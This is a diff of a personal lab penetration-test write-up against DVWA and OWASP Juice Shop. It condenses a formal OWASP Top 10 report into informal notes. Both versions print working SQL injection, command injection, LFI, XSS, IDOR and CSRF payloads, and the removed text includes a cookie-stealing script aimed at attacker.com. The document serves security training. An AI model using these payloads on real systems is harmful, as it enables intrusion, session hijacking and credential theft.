@@ -1,481 +1,195 @@
-# Web Application Security Assessment Report
+# Findings Report
 
-**Assessment Type:** OWASP Top 10 Manual Penetration Test  
-**Target Applications:** DVWA (Damn Vulnerable Web Application), OWASP Juice Shop  
-**Environment:** Local Docker containers (non-production lab)  
-**Assessment Date:** June 15, 2024  
-**Assessor:** WaiLinOo  
-**Classification:** Confidential — Lab / Portfolio  
+This is my write-up of everything I found during the lab. Not a formal pentest report, just documenting what I did and what worked.
 
----
-
-## Executive Summary
-
-A manual web application security assessment was performed against two intentionally vulnerable applications: DVWA and OWASP Juice Shop. The assessment covered all OWASP Top 10 (2021) categories using Burp Suite as the primary proxy and testing tool, supplemented by automated scanning with Nikto and SQLmap and a custom Python fuzzer.
-
-**16 vulnerabilities were identified** across 8 of the 10 OWASP Top 10 categories. The overall risk posture of both applications is critical — both are intentionally vulnerable for training purposes, but the findings accurately represent the class of vulnerabilities commonly seen in real-world assessments.
-
-| Severity | Count |
-|----------|-------|
-| Critical | 3 |
-| High | 6 |
-| Medium | 5 |
-| Low | 2 |
-| **Total** | **16** |
+**Apps tested:** DVWA (security=low), OWASP Juice Shop  
+**Tools:** Burp Suite, SQLmap, Nikto, Python fuzzer  
+**Date:** June 2024
 
 ---
 
-## Scope
+## Findings
 
-| Target | URL | Notes |
-|--------|-----|-------|
-| DVWA | http://localhost | Security level: Low |
-| OWASP Juice Shop | http://localhost:3000 | Default configuration |
+### 1. SQL Injection — DVWA
 
-**In scope:** All functionality accessible via the web browser without admin credentials (with the exception of the admin bypass finding).  
-**Out of scope:** Network-layer attacks, denial of service, host OS exploitation.
+**Endpoint:** `/dvwa/vulnerabilities/sqli/?id=`  
+**Severity:** Critical
 
----
-
-## Methodology
-
-Testing followed the OWASP Testing Guide v4.2 methodology:
-
-1. **Reconnaissance** — Manual browsing with Burp proxy active, Nikto scan, spidering HTTP history
-2. **Vulnerability identification** — Manual payload testing per OWASP Top 10 category
-3. **Exploitation** — Confirmed exploitability with working proof-of-concept for each finding
-4. **Automation** — SQLmap to confirm SQL injection, custom fuzzer for regression coverage
-5. **Documentation** — Each finding recorded with evidence, impact, and remediation
-
----
-
-## Findings Summary
-
-| # | Title | App | Severity | OWASP Category | CVSS v3.1 |
-|---|-------|-----|----------|----------------|-----------|
-| 1 | SQL Injection — UNION-based extraction | DVWA | Critical | A03 Injection | 9.8 |
-| 2 | SQL Injection — Login bypass | Juice Shop | Critical | A07 Auth Failures | 9.8 |
-| 3 | Command Injection — Remote Code Execution | DVWA | Critical | A03 Injection | 9.8 |
-| 4 | Stored Cross-Site Scripting | DVWA | High | A03 Injection | 8.8 |
-| 5 | Local File Inclusion | DVWA | High | A03 Injection | 7.5 |
-| 6 | IDOR on Basket API | Juice Shop | High | A01 Broken Access Control | 7.5 |
-| 7 | Admin panel accessible without auth | Juice Shop | High | A01 Broken Access Control | 7.3 |
-| 8 | Passwords stored as unsalted MD5 | DVWA | High | A02 Crypto Failures | 7.5 |
-| 9 | Missing CSRF tokens | DVWA | Medium | A08 Integrity Failures | 6.5 |
-| 10 | Reflected Cross-Site Scripting | DVWA | Medium | A03 Injection | 6.1 |
-| 11 | DOM-based Cross-Site Scripting | DVWA | Medium | A03 Injection | 6.1 |
-| 12 | No rate limiting on login | Juice Shop | Medium | A07 Auth Failures | 5.3 |
-| 13 | Verbose SQL error messages | DVWA | Medium | A05 Misconfiguration | 5.3 |
-| 14 | Default credentials accepted | DVWA | Medium | A05 Misconfiguration | 5.3 |
-| 15 | No logging on failed login attempts | DVWA | Low | A09 Logging Failures | 3.7 |
-| 16 | Outdated server version in headers | DVWA | Low | A06 Vulnerable Components | 3.1 |
-
----
-
-## Detailed Findings
-
----
-
-### Finding 1 — SQL Injection: UNION-based Data Extraction
-
-**Severity:** Critical  
-**CVSS v3.1 Score:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
-**OWASP Category:** A03:2021 — Injection  
-**Application:** DVWA  
-**Endpoint:** `http://localhost/dvwa/vulnerabilities/sqli/?id=`
-
-**Description**
-
-The `id` parameter is directly concatenated into a MySQL query with no parameterisation or input sanitisation.
-
-**Evidence**
+The id parameter goes straight into a SQL query with no sanitisation. Using `' OR 1=1-- -` returned all users. Then used UNION SELECT to grab the database name and dump the users table including password hashes.
 
 ```
-' ORDER BY 2-- -    → OK
-' ORDER BY 3-- -    → Error (confirmed 2 columns)
-
-' UNION SELECT null,database()-- -
-→ Response: dvwa
-
-' UNION SELECT user,password FROM users-- -
-→ admin | 5f4dcc3b5aa765d61d8327deb882cf99  (= "password")
-  gordonb | e99a18c428cb38d5f260853678922e03 (= "abc123")
-  pablo | 0d107d09f5bbe40cade3de5c71e9e9b7   (= "letmein")
+' UNION SELECT null,database()-- -      --> dvwa
+' UNION SELECT user,password FROM users-- -  --> dumped all 5 users + hashes
 ```
 
-Confirmed with SQLmap (`--dbs --batch`) — full database enumeration successful.
+All hashes were unsalted MD5 and cracked immediately on crackstation.net (e.g. admin = "password").
 
-**Impact**
+Also confirmed everything with SQLmap which found the same injection point automatically.
 
-Full read access to the database. Credential extraction, potential OS escalation via `--os-shell`.
-
-**Remediation**
-
-Use parameterised queries (prepared statements):
-```php
-$stmt = $mysqli->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
-$stmt->bind_param("s", $id);
-$stmt->execute();
-```
+**Fix:** Use prepared statements / parameterised queries. Don't store passwords as MD5 - use bcrypt.
 
 ---
 
-### Finding 2 — SQL Injection: Login Bypass
+### 2. SQL Injection Login Bypass — Juice Shop
 
-**Severity:** Critical  
-**CVSS v3.1 Score:** 9.8  
-**OWASP Category:** A07:2021 — Identification and Authentication Failures  
-**Application:** OWASP Juice Shop  
-**Endpoint:** `POST http://localhost:3000/rest/user/login`
+**Endpoint:** `POST /rest/user/login`  
+**Severity:** Critical
 
-**Evidence**
+Same idea as above but on the login form. Entering `' OR 1=1-- -` as the email with any password logged me in as admin. Juice Shop confirmed with a challenge notification.
 
-Email field: `' OR 1=1-- -` / Password: anything → Logged in as admin@juice-sh.op immediately.
-
-**Impact**
-
-Unauthenticated access to any account including admin. Combined with Finding 7, grants full administrative access.
-
-**Remediation**
-
-Parameterise the login query. Implement account lockout (see Finding 12).
+**Fix:** Parameterise the login query.
 
 ---
 
-### Finding 3 — Command Injection: Remote Code Execution
+### 3. Command Injection (RCE) — DVWA
 
-**Severity:** Critical  
-**CVSS v3.1 Score:** 9.8  
-**OWASP Category:** A03:2021 — Injection  
-**Application:** DVWA  
-**Endpoint:** `POST http://localhost/dvwa/vulnerabilities/exec/`
+**Endpoint:** `/dvwa/vulnerabilities/exec/`  
+**Severity:** Critical
 
-**Evidence**
-
+The ping input goes directly to a shell exec call. Injecting `127.0.0.1; id` returned:
 ```
-Input:  127.0.0.1; id
-Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
-
-Input:  127.0.0.1; cat /etc/passwd
-Output: [full /etc/passwd printed in response]
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-**Impact**
+Then tried `127.0.0.1; cat /etc/passwd` and got the full passwd file. Full RCE.
 
-Full RCE as the web server process. Attacker can establish reverse shell, read arbitrary files, pivot.
-
-**Remediation**
-
-Never pass user input to shell functions. Use `escapeshellarg()` if shell calls are unavoidable. Prefer native language APIs.
+**Fix:** Never pass user input to shell functions. Use language-native socket/ping implementations instead.
 
 ---
 
-### Finding 4 — Stored Cross-Site Scripting
+### 4. Reflected XSS — DVWA
 
-**Severity:** High  
-**CVSS v3.1 Score:** 8.8  
-**OWASP Category:** A03:2021 — Injection  
-**Application:** DVWA — XSS Stored (guestbook)
+**Endpoint:** `/dvwa/vulnerabilities/xss_r/?name=`  
+**Severity:** Medium
 
-**Evidence**
+Input is reflected back with no HTML encoding. `<script>alert('XSS')</script>` fired immediately. Also works with img onerror and svg onload for bypassing basic filters.
 
-Submitted to guestbook (bypassed client-side maxlength via devtools):
+**Fix:** HTML encode all user output. htmlspecialchars() in PHP.
+
+---
+
+### 5. Stored XSS — DVWA
+
+**Endpoint:** Guestbook page  
+**Severity:** High
+
+The name field has maxlength=10 in the HTML but that's client-side only. Removed it in devtools and submitted a script tag. It persists in the database and fires on every page load.
+
+In real life you'd use this to steal session cookies from every visitor.
+
+**Fix:** HTML encode stored output and validate server-side, not just client-side.
+
+---
+
+### 6. DOM-based XSS — DVWA
+
+**Endpoint:** `/dvwa/vulnerabilities/xss_d/?default=`  
+**Severity:** Medium
+
+Different from reflected XSS - the payload never hits the server. The JS on the page reads the URL parameter and writes it to the DOM with document.write() without sanitising it. Alert fired but the Burp request shows a clean server response - the injection is purely client-side.
+
+This is harder to detect with server-side scanners.
+
+**Fix:** Don't use document.write() or innerHTML with user-controlled data. Use textContent instead.
+
+---
+
+### 7. Local File Inclusion — DVWA
+
+**Endpoint:** `/dvwa/vulnerabilities/fi/?page=`  
+**Severity:** High
+
+The page parameter gets passed to PHP include() with no validation. Path traversal with `../../../../../../etc/passwd` printed the full file in the browser.
+
+Also tried the PHP filter wrapper to read PHP source:
+```
+?page=php://filter/convert.base64-encode/resource=index.php
+```
+That worked too.
+
+allow_url_include was off so no remote file inclusion, but LFI alone is bad enough.
+
+**Fix:** Whitelist allowed page values server-side. Never use user input in include() directly.
+
+---
+
+### 8. IDOR on Basket API — Juice Shop
+
+**Endpoint:** `POST /api/BasketItems`  
+**Severity:** High
+
+Added something to my basket and intercepted in Burp. The request includes `"BasketId": 2` (my basket). Changed it to `"BasketId": 1` in Repeater and got back `201 Created` - item added to someone else's basket. No ownership check on the server.
+
+Also tested reading another basket directly with `GET /rest/basket/1` using my token - returned basket 1's contents fine.
+
+**Fix:** Check that the authenticated user actually owns the basket ID they're requesting.
+
+---
+
+### 9. Admin Panel Without Auth — Juice Shop
+
+**Endpoint:** `/#/administration`  
+**Severity:** High
+
+Logged in as a regular user and navigated directly to the admin page URL. It loaded and showed all user emails and reviews. The frontend router blocks it visually but the backend APIs don't enforce the role check.
+
+**Fix:** Check user role server-side on every API endpoint, not just in the Angular router.
+
+---
+
+### 10. Missing CSRF Protection — DVWA
+
+**Endpoint:** `/dvwa/vulnerabilities/csrf/`  
+**Severity:** Medium
+
+The password change form uses GET and has no CSRF token. Built a proof of concept:
+
 ```html
-<script>document.location='http://attacker.com?c='+document.cookie</script>
+<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0">
 ```
-Payload persists in DB and executes for every visitor.
 
-**Impact**
+If a logged in user visits a page with this tag, their password changes silently. My fuzzer also confirmed this automatically.
 
-Session hijacking of all users who view the guestbook. More dangerous than reflected XSS — no per-victim delivery required.
-
-**Remediation**
-
-HTML-encode all user-supplied output (`htmlspecialchars($output, ENT_QUOTES)`). Implement Content Security Policy.
+**Fix:** Add a per-session CSRF token validated server-side.
 
 ---
 
-### Finding 5 — Local File Inclusion
+### 11. No Rate Limiting on Login — Juice Shop
 
-**Severity:** High  
-**CVSS v3.1 Score:** 7.5  
-**OWASP Category:** A03:2021 — Injection  
-**Application:** DVWA  
-**Endpoint:** `http://localhost/dvwa/vulnerabilities/fi/?page=`
+**Severity:** Medium
 
-**Evidence**
+Sent 50 rapid login requests via Burp Intruder, all got 401 with no throttling, no 429, no lockout. Ran Hydra briefly at ~100 req/s and nothing stopped it.
 
-```
-?page=../../../../../../etc/passwd          → full /etc/passwd in browser
-?page=php://filter/convert.base64-encode/resource=index.php → PHP source (base64)
-```
-
-**Remediation**
-
-Whitelist allowed page values server-side. Never pass user input to `include()` or `require()`.
+**Fix:** Rate limit the login endpoint, add exponential backoff after repeated failures.
 
 ---
 
-### Finding 6 — IDOR on Basket API
+### 12-16. Misc Findings
 
-**Severity:** High  
-**CVSS v3.1 Score:** 7.5  
-**OWASP Category:** A01:2021 — Broken Access Control  
-**Application:** OWASP Juice Shop  
-**Endpoint:** `POST /api/BasketItems`, `GET /rest/basket/{id}`
+**Verbose SQL errors** — DVWA returns full MySQL error messages on injection, confirms database type and query structure. Should suppress these in production.
 
-**Evidence**
+**Default credentials** — Both apps accepted default creds (admin/password on DVWA, admin@juice-sh.op/admin123 on Juice Shop) without any prompt to change them.
 
-Changed `BasketId` from own value (2) to another user's (1) in Burp Repeater:
-```json
-{"ProductId": 1, "BasketId": 1, "quantity": 1}  →  201 Created
-GET /rest/basket/1  (with token for user 2)       →  200 OK, returns user 1's basket
-```
+**Unsalted MD5** — Already mentioned under finding 1 but worth flagging separately. All 5 DVWA passwords stored as plain MD5, all cracked in seconds.
 
-**Remediation**
+**No logging on failed logins** — Ran brute force against DVWA, checked docker logs after, no authentication events were logged at all.
 
-Validate basket ownership server-side against the authenticated user's session. Never trust client-supplied IDs for ownership checks.
+**Outdated server headers** — DVWA returns `Server: Apache/2.4.25` and `X-Powered-By: PHP/7.0.33`. Both are years out of date with known CVEs. Nikto flagged these too.
 
 ---
 
-### Finding 7 — Admin Panel Accessible Without Authentication
+## What Nikto found
 
-**Severity:** High  
-**CVSS v3.1 Score:** 7.3  
-**OWASP Category:** A01:2021 — Broken Access Control  
-**Application:** OWASP Juice Shop  
-**Endpoint:** `http://localhost:3000/#/administration`
+Ran Nikto against both apps separately, outputs in `notes/nikto_dvwa.txt` and `notes/nikto_juiceshop.txt`.
 
-**Evidence**
+Main things it caught: outdated Apache/PHP versions, missing security headers (X-Frame-Options, X-Content-Type-Options, X-XSS-Protection), phpinfo.php exposed, directory indexing on several paths, HTTP TRACE enabled.
 
-Logged in as regular user → navigated directly to `/#/administration` → page loaded with all user emails and reviews. The access control exists only in the Angular router (frontend) — the backend API endpoints that populate the page respond to any valid JWT.
-
-**Remediation**
-
-Enforce role checks server-side on every admin API endpoint, not in the frontend router.
+Nikto missed most of the actual vulnerabilities (SQLi, XSS, etc.) - those needed manual testing with Burp.
 
 ---
 
-### Finding 8 — Passwords Stored as Unsalted MD5
+## Fuzzer results
 
-**Severity:** High  
-**CVSS v3.1 Score:** 7.5  
-**OWASP Category:** A02:2021 — Cryptographic Failures  
-**Application:** DVWA
+Ran fuzzer.py against DVWA with security=low. It detected SQLi, reflected XSS, command injection, LFI, and the CSRF issue automatically. Output went to fuzzer_results.txt.
 
-**Evidence**
-
-From SQLi dump — all passwords are unsalted MD5. Cracked in seconds via crackstation.net:
-
-| Username | Hash | Cracked |
-|----------|------|---------|
-| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
-| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
-| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
-
-**Remediation**
-
-Use Argon2id, bcrypt, or scrypt with automatic per-user salting:
-```php
-$hash = password_hash($password, PASSWORD_ARGON2ID);
-```
-
----
-
-### Finding 9 — Missing CSRF Tokens on Password Change
-
-**Severity:** Medium  
-**CVSS v3.1 Score:** 6.5  
-**OWASP Category:** A08:2021 — Software and Data Integrity Failures  
-**Application:** DVWA  
-**Endpoint:** `GET http://localhost/dvwa/vulnerabilities/csrf/`
-
-**Evidence**
-
-PoC attack page — if a logged-in DVWA user loads this, their password changes silently:
-```html
-<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">
-```
-Fuzzer confirmed submission accepted with no Referer header.
-
-**Remediation**
-
-Generate random per-session CSRF token, embed in forms, validate server-side. Also set `SameSite=Lax` on session cookies.
-
----
-
-### Finding 10 — Reflected Cross-Site Scripting
-
-**Severity:** Medium  
-**CVSS v3.1 Score:** 6.1  
-**OWASP Category:** A03:2021 — Injection  
-**Application:** DVWA  
-**Endpoint:** `http://localhost/dvwa/vulnerabilities/xss_r/?name=`
-
-**Evidence**
-
-```
-?name=<script>alert('XSS')</script>  → alert fires, tag reflected verbatim
-?name=<img src=x onerror=alert(1)>  → alert fires
-?name=<svg onload=alert('XSS')>     → alert fires
-```
-
-**Remediation**
-
-HTML-encode all reflected user input. Implement Content-Security-Policy header.
-
----
-
-### Finding 11 — DOM-based Cross-Site Scripting
-
-**Severity:** Medium  
-**CVSS v3.1 Score:** 6.1  
-**OWASP Category:** A03:2021 — Injection  
-**Application:** DVWA  
-**Endpoint:** `http://localhost/dvwa/vulnerabilities/xss_d/?default=`
-
-**Evidence**
-
-Payload never reaches the server — injected entirely client-side via `document.write()`:
-```
-?default=<script>alert('DOM XSS')</script>  → alert fires
-#<img src=x onerror=alert('DOM XSS')>       → fragment never sent to server, still fires
-```
-
-**Remediation**
-
-Use `textContent` instead of `innerHTML`/`document.write()`. Sanitise with DOMPurify. Audit all JS reading from `location`, `document.URL`, `document.referrer`.
-
----
-
-### Finding 12 — No Rate Limiting on Login Endpoint
-
-**Severity:** Medium  
-**CVSS v3.1 Score:** 5.3  
-**OWASP Category:** A07:2021 — Identification and Authentication Failures  
-**Application:** OWASP Juice Shop
-
-**Evidence**
-
-50 rapid Burp Intruder requests — all got consistent 401 responses with no throttling, 429, or lockout. Hydra ran at ~100 req/s sustained with no slowdown.
-
-**Remediation**
-
-Rate limit to max 5 attempts/IP/minute. Implement exponential backoff and account lockout. Use `express-rate-limit` or equivalent middleware.
-
----
-
-### Finding 13 — Verbose SQL Error Messages
-
-**Severity:** Medium  
-**CVSS v3.1 Score:** 5.3  
-**OWASP Category:** A05:2021 — Security Misconfiguration  
-**Application:** DVWA
-
-**Evidence**
-
-Input `'` returns:
-```
-You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
-```
-Revealed DB type (MySQL), confirmed injection point, guided UNION payload construction.
-
-**Remediation**
-
-Set `display_errors = Off` in php.ini. Log errors server-side only. Return generic error pages.
-
----
-
-### Finding 14 — Default Credentials Accepted
-
-**Severity:** Medium  
-**CVSS v3.1 Score:** 5.3  
-**OWASP Category:** A05:2021 — Security Misconfiguration  
-**Application:** DVWA, Juice Shop
-
-**Evidence**
-
-- DVWA: `admin / password` — login successful first attempt
-- Juice Shop: `admin@juice-sh.op / admin123` — login successful first attempt
-
-**Remediation**
-
-Force credential change on first login. Remove/randomise built-in default accounts before deployment.
-
----
-
-### Finding 15 — No Logging of Failed Authentication Attempts
-
-**Severity:** Low  
-**CVSS v3.1 Score:** 3.7  
-**OWASP Category:** A09:2021 — Security Logging and Monitoring Failures  
-**Application:** DVWA
-
-**Evidence**
-
-50 failed login attempts generated zero new log entries:
-```bash
-docker exec dvwa find /var/log -newer /tmp -type f
-# → no output
-```
-
-**Remediation**
-
-Log all auth events (success + failure) with timestamp, source IP, username. Alert when failure rate exceeds threshold.
-
----
-
-### Finding 16 — Outdated Server Version Exposed in HTTP Headers
-
-**Severity:** Low  
-**CVSS v3.1 Score:** 3.1  
-**OWASP Category:** A06:2021 — Vulnerable and Outdated Components  
-**Application:** DVWA
-
-**Evidence**
-
-```
-Server: Apache/2.4.25 (Debian)   ← released 2016, multiple CVEs
-X-Powered-By: PHP/7.0.33         ← EOL December 2018
-```
-
-**Remediation**
-
-Apache: `ServerTokens Prod` in config. PHP: `expose_php = Off`. Update to supported versions.
-
----
-
-## OWASP Top 10 Coverage
-
-| OWASP Category | Tested | Findings |
-|----------------|--------|----------|
-| A01 — Broken Access Control | ✓ | #6, #7 |
-| A02 — Cryptographic Failures | ✓ | #8 |
-| A03 — Injection | ✓ | #1, #2, #3, #4, #5, #10, #11 |
-| A04 — Insecure Design | ✓ | No findings |
-| A05 — Security Misconfiguration | ✓ | #13, #14 |
-| A06 — Vulnerable & Outdated Components | ✓ | #16 |
-| A07 — Auth Failures | ✓ | #2, #12 |
-| A08 — Software & Data Integrity Failures | ✓ | #9 |
-| A09 — Logging & Monitoring Failures | ✓ | #15 |
-| A10 — SSRF | ✓ | No findings (no applicable endpoints) |
-
----
-
-## Tools Used
-
-| Tool | Purpose |
-|------|---------|
-| Burp Suite Community | Primary proxy, Repeater, Intruder |
-| SQLmap | SQL injection confirmation and automation |
-| Nikto | Web server misconfiguration scanning |
-| Hydra | Login brute-force testing |
-| fuzzer.py (custom) | Automated SQLi, XSS, CMDI, LFI, CSRF testing |
-| Docker | Target application deployment |
-| Firefox | Browser with Burp proxy configured |
-
----
-
-## Conclusion
-
-All 16 findings are the result of common, well-documented vulnerability classes. The three critical findings (SQL injection, login bypass, and RCE) each represent full application compromise on their own. The assessment demonstrates that automated tools alone are insufficient — DOM XSS, CSRF, and IDOR required manual analysis and were not flagged by Nikto.
+The fuzzer is pretty basic - it checks for known error strings and reflected payloads. It wouldn't catch stored XSS, DOM XSS, IDOR or the admin panel issue since those need more context.
